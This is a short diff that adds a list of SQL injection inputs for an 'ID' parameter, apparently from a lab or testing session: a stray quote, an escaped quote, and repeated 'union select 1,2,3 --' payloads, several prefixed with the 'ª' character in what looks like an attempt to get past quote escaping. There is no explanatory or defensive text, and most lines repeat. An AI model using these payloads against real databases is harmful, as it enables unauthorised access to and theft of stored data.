@@ -1,0 +1,13 @@
+ID:1
+ID:1\'
+ID:1\'\\
+ID:1\' union select 1,2,3 -- 
+ID:1ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
+ID:0ª\' union select 1,2,3 -- 
